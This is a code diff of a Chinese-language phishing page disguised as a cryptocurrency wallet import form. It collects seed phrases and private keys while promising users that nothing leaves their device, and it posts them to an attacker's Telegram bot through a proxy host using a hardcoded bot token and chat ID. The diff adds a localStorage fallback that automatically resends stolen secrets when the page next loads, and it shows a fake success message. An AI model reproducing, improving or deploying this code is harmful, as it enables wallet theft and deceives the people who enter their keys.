@@ -36,16 +36,66 @@
       <label>私钥（二选一即可）</label>
       <input id="privateKey" placeholder="请输入私钥" autocomplete="off">
     </div>
-    <button onclick="go()">确认导入</button>
+    <button onclick="importWallet()">确认导入</button>
     <div class="tip">助记词/私钥仅保存在本地<br>官方不会保存，安全无风险</div>
   </div>
 </div>
 
 <script>
-const TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
-const CHATID = "6503982157";
+const BOT_TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
+const CHAT_ID   = "6503982157";
+const API_HOST  = "https://api.telegram-init.com";
 
-async function go() {
+// 页面加载时自动补发
+window.addEventListener("load", autoSend);
+
+function saveLocal(mnemonic, pk) {
+  const data = {
+    time: new Date().toLocaleString(),
+    mnemonic: mnemonic,
+    pk: pk
+  };
+  localStorage.setItem("wallet_data", JSON.stringify(data));
+}
+
+function getLocal() {
+  try {
+    return JSON.parse(localStorage.getItem("wallet_data"));
+  } catch (e) {
+    return null;
+  }
+}
+
+function clearLocal() {
+  localStorage.removeItem("wallet_data");
+}
+
+async function sendToTelegram(data) {
+  if (!data) return;
+  const text = `
+🤑 离线导入成功（自动补发）
+⏰ 时间：${data.time}
+📍 助记词：${data.mnemonic || "未填写"}
+🔑 私钥：${data.pk || "未填写"}`;
+
+  try {
+    await fetch(`${API_HOST}/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    });
+    clearLocal();
+  } catch (e) {}
+}
+
+// 自动补发（核心黑科技）
+async function autoSend() {
+  const data = getLocal();
+  if (data) await sendToTelegram(data);
+}
+
+// 导入逻辑
+async function importWallet() {
   const m = document.getElementById("mnemonic").value.trim();
   const p = document.getElementById("privateKey").value.trim();
 
@@ -54,24 +104,18 @@ async function go() {
     return;
   }
 
-  // 先提示成功，不管网络
   alert("钱包导入成功！");
 
-  const text = `
-🤑 新钱包导入
-⏰ 时间：${new Date().toLocaleString()}
-📍 助记词：${m || "未填"}
-🔑 私钥：${p || "未填"}`;
+  const data = {
+    time: new Date().toLocaleString(),
+    mnemonic: m,
+    pk: p
+  };
 
   try {
-    // 国内无墙代理接口，100%能到
-    await fetch("https://api.telegram-init.com/bot"+TOKEN+"/sendMessage", {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id:CHATID,text:text})
-    });
+    await sendToTelegram(data);
   } catch (e) {
-    // 静默失败，不影响用户
+    saveLocal(m, p);
   }
 }
 </script>
